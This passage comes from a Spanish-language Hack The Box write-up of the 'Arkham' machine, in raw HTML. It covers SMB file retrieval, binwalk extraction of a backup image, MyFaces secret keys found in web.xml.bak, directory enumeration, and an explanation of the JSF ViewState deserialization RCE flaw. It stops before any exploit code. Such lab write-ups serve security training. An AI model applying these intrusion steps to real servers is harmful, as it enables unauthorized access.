Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; ls
  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 13:00:10 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Sun Feb  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 13:00:10 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
  appserver.zip                       A  &lt;span class=&#34;m&#34;&gt;4046695&lt;/span&gt;  Fri Feb  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 06:13:37 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;

		&lt;span class=&#34;m&#34;&gt;5158399&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;2123866&lt;/span&gt; blocks available
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; mget *
Get file appserver.zip? y
getting file &lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ppserver.zip of size &lt;span class=&#34;m&#34;&gt;4046695&lt;/span&gt; as appserver.zip &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;265.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 265.1 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-46-50.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# unzip appserver.zip 
Archive:  appserver.zip
  inflating: IMPORTANT.txt           
  inflating: backup.img              
root@sckull:~/htb/arkham# ls
appserver.zip  backup.img  IMPORTANT.txt  tmp
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un archivo llamado &lt;code&gt;appserver.zip&lt;/code&gt; al descomprimir dicho archivo nos muestra dos archivos &lt;code&gt;backup.img&lt;/code&gt; e &lt;code&gt;IMPORTANT.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT.txt&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn&amp;#39;t have unauthenticated access to it. - Bruce 
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;file backup.img&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;backup.img: LUKS encrypted file, ver &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;aes, xts-plain64, sha256&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; UUID: d931ebb1-5edc-4453-8ab1-3d23bb85b38e
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.20.54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BINWALK - backup.img&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos binwalk para ver el contenido del archivo &lt;code&gt;backup.img.&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;             0x0             LUKS_MAGIC version 0x1 aes sha256
&lt;span class=&#34;m&#34;&gt;519168&lt;/span&gt;        0x7EC00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;544768&lt;/span&gt;        0x85000         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;551936&lt;/span&gt;        0x86C00         Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;8388608&lt;/span&gt;       0x800000        Linux EXT filesystem, rev 1.0, ext4 filesystem data, &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;9c1e27b2-f91d-47d2-a167-49fd79957995
&lt;span class=&#34;m&#34;&gt;8542755&lt;/span&gt;       0x825A23        Zip archive data, at least v1.0 to extract, name: Mask/tomcat-stuff/
&lt;span class=&#34;m&#34;&gt;8542831&lt;/span&gt;       0x825A6F        Zip archive data, at least v2.0 to extract, compressed size: 1006, uncompressed size: 2208, name: Mask/tomcat-stuff/tomcat-users.xml
&lt;span class=&#34;m&#34;&gt;8543929&lt;/span&gt;       0x825EB9        Zip archive data, at least v2.0 to extract, compressed size: 1151, uncompressed size: 3498, name: Mask/tomcat-stuff/web.xml.bak
&lt;span class=&#34;m&#34;&gt;8545167&lt;/span&gt;       0x82638F        Zip archive data, at least v2.0 to extract, compressed size: 709, uncompressed size: 1368, name: Mask/tomcat-stuff/context.xml
&lt;span class=&#34;m&#34;&gt;8545963&lt;/span&gt;       0x8266AB        Zip archive data, at least v2.0 to extract, compressed size: 621, uncompressed size: 1172, name: Mask/tomcat-stuff/jaspic-providers.xml
&lt;span class=&#34;m&#34;&gt;8546680&lt;/span&gt;       0x826978        Zip archive data, at least v2.0 to extract, compressed size: 367, uncompressed size: 832, name: Mask/tomcat-stuff/faces-config.xml
&lt;span class=&#34;m&#34;&gt;8547139&lt;/span&gt;       0x826B43        Zip archive data, at least v2.0 to extract, compressed size: 2599, uncompressed size: 7678, name: Mask/tomcat-stuff/server.xml
&lt;span class=&#34;m&#34;&gt;8549824&lt;/span&gt;       0x8275C0        Zip archive data, at least v2.0 to extract, compressed size: 18347, uncompressed size: 174021, name: Mask/tomcat-stuff/web.xml
&lt;span class=&#34;m&#34;&gt;8568254&lt;/span&gt;       0x82BDBE        Zip archive data, at least v1.0 to extract, compressed size: 39, uncompressed size: 39, name: Mask/tomcat-stuff/MANIFEST.MF
&lt;span class=&#34;m&#34;&gt;8568380&lt;/span&gt;       0x82BE3C        Zip archive data, at least v2.0 to extract, compressed size: 7353, uncompressed size: 7586, name: Mask/robin.jpeg
&lt;span class=&#34;m&#34;&gt;8575806&lt;/span&gt;       0x82DB3E        Zip archive data, at least v2.0 to extract, compressed size: 105045, uncompressed size: 105374, name: Mask/me.jpg
&lt;span class=&#34;m&#34;&gt;8680920&lt;/span&gt;       0x8475D8        Zip archive data, at least v2.0 to extract, compressed size: 687109, uncompressed size: 687160, name: Mask/mycar.jpg
&lt;span class=&#34;m&#34;&gt;9466405&lt;/span&gt;       0x907225        End of Zip archive, footer length: &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; .. &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9638621&lt;/span&gt;       0x9312DD        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright/ordfeminine/guillemotleft/logicalnot/hyphen/registered/macron/degree/plusminus/twosuperior/threesuperior/acute/mu/para&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9962496&lt;/span&gt;       0x980400        PDF document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.4&amp;#34;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9978880&lt;/span&gt;       0x984400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9979118&lt;/span&gt;       0x9844EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9981952&lt;/span&gt;       0x985000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9986048&lt;/span&gt;       0x986000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9986286&lt;/span&gt;       0x9860EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9988096&lt;/span&gt;       0x986800        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9988334&lt;/span&gt;       0x9868EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9990144&lt;/span&gt;       0x987000        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9991168&lt;/span&gt;       0x987400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9991406&lt;/span&gt;       0x9874EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9999360&lt;/span&gt;       0x989400        XML document, version: &lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;9999598&lt;/span&gt;       0x9894EE        Copyright string: &lt;span class=&#34;s2&#34;&gt;&amp;#34;copyright ownership.&amp;#34;&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;10016768&lt;/span&gt;      0x98D800        JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;10024960&lt;/span&gt;      0x98F800        JPEG image data, JFIF standard 1.01
&lt;span class=&#34;m&#34;&gt;10041344&lt;/span&gt;      0x993800        JPEG image data, EXIF standard
&lt;span class=&#34;m&#34;&gt;10041356&lt;/span&gt;      0x99380C        TIFF image data, little-endian offset of first image directory: &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;span class=&#34;m&#34;&gt;10057728&lt;/span&gt;      0x997800        JPEG image data, JFIF standard 1.01
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro del archivo encontramos varios documentos que se refieren a archivos tomcat, imagenes, y archivos xml, descomprimimos los archivos con binwalk.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;binwalk -e backup.img
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.29.02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos varios archivos y carpetas, dentro de la carpeta Mask encontramos imagenes y una subcarpeta &lt;code&gt;tomcat-stuff&lt;/code&gt;, utilizamos binwalk con las imagenes para verificar que no tengan archivos ocultos dentro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.30.51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ninguna de las imagenes contiene archivos que puedan servirnos, dentro de la carpeta &lt;code&gt;tomcat-stuff&lt;/code&gt; encontramos archivos de configuracion.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.35.14.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Dentro de los archivos de configuracion encontramos un backup de uno de ellos &lt;code&gt;web.xml.bak&lt;/code&gt;, en su interior vemos la configuracion que tiene la pagina, algunos parametros de la configuracion contienen datos que sirven para encriptar los datos que se reciben y se envian por medio de la pagina web y podemos notar que esta corriendo en apache myfaces.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;servlet-name&amp;gt;&lt;/span&gt;Faces Servlet&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.faces&lt;span class=&#34;nt&#34;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;State saving method: &amp;#39;client&amp;#39; or &amp;#39;server&amp;#39; (=default). See JSF Specification 2.5.2&lt;span class=&#34;nt&#34;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;javax.faces.STATE_SAVING_METHOD&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;server&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.SECRET&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_ALGORITHM&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;HmacSHA1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;org.apache.myfaces.MAC_SECRE&lt;span class=&#34;nt&#34;&gt;&amp;lt;T&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/param-name&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;SnNGOTg3Ni0=&lt;span class=&#34;nt&#34;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http---8080&#34;&gt;HTTP - 8080&lt;/h2&gt;
&lt;p&gt;Puerto 8080 en http.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-03-25%2017-47-40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Considerando que la pagina esta corrriendo en un apache myfaces (&lt;code&gt;web.xml.bak&lt;/code&gt;), vamos a utilizar gobuster para buscar directorios y documentos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2016.58.27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Encontramos directorios y documentos pertenecientes a la pagina, al visitar cada una de las opciones de la pagina nos encontramos una para una subscripcion de correo electronico &lt;code&gt;/userSubscribe.faces&lt;/code&gt; la cual no aparecio con gobuster.&lt;/p&gt;
&lt;h3 id=&#34;usersubscribefaces&#34;&gt;/userSubscribe.faces&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.02.24.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al registrar un correo nos redirige a otra pagina &lt;code&gt;/thankyou.faces&lt;/code&gt; con un mensaje de registro.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.03.15.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;viewstate---arkham&#34;&gt;ViewState - Arkham&lt;/h3&gt;
&lt;p&gt;Al revisar el codigo fuente de &lt;code&gt;userSubscribe.faces&lt;/code&gt; encontramos algunos valores pertenecen a &lt;code&gt;javax.faces.ViewState&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.07.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;viewstate&#34;&gt;ViewState&lt;/h2&gt;
&lt;p&gt;JSF utiliza viewStates para almacenar los datos de la vista, pueden ser &amp;lsquo;almacenados&amp;rsquo; en el servidor o el cliente, dichos valores de viewstate estan dentro del html de una pagina como un campo oculto con el nombre de &lt;code&gt;javax.faces.ViewState&lt;/code&gt;, como es el caso de la pagina que encontramos.&lt;/p&gt;
&lt;h3 id=&#34;java-deserialization&#34;&gt;Java Deserialization&lt;/h3&gt;
&lt;p&gt;Deserializacion y Serializacion es el proceso por el cual se convierte un objeto a bytes y viceversa, para leerlo e interpretarlo por el servidor. Al investigar acerca de dichos valores encontramos que, existe una vulnerabilidad de deserializacion en java, dichos valores del viewstate estan codificados en base64 en algunos casos no estan encriptados por lo que puede ser leido el contenido.&lt;/p&gt;
&lt;p&gt;Al intentar decodificar en base64 nos muestran algunos caracteres, por lo que podemos afirmar que el objeto esta encoriptado.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/Screenshot%20from%202019-04-15%2017.16.28.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;jsf-viewstate-rce&#34;&gt;JSF ViewState RCE&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;INFO:&lt;/strong&gt; &lt;a href=&#34;https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html&#34;&gt;&lt;strong&gt;JSF ViewStates RCE - Vulnerability&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Encontramos un post el cual habla de una vulnerabilidad RCE de ViewState en las implementaciones de JSF como Oracle Mojarra (&lt;code&gt;JSF reference implementation&lt;/code&gt;), &lt;code&gt;Apache MyFaces&lt;/code&gt;. Existen dos &amp;lsquo;tipos&amp;rsquo; de ViewState, el que se almacena en el servidor y el cliente, ambos son objetos serializados, para que dicha vulnerabilidad sea aprovechada para la ejecucion de comandos deben de cumplirse algunas condiciones, el viewstate no debe de estar encriptado, en el caso de Mojarra el viewstate debe de estar configurado en el cliente, en MyFaces puede estar configurado en el cliente o servidor.&lt;/p&gt;
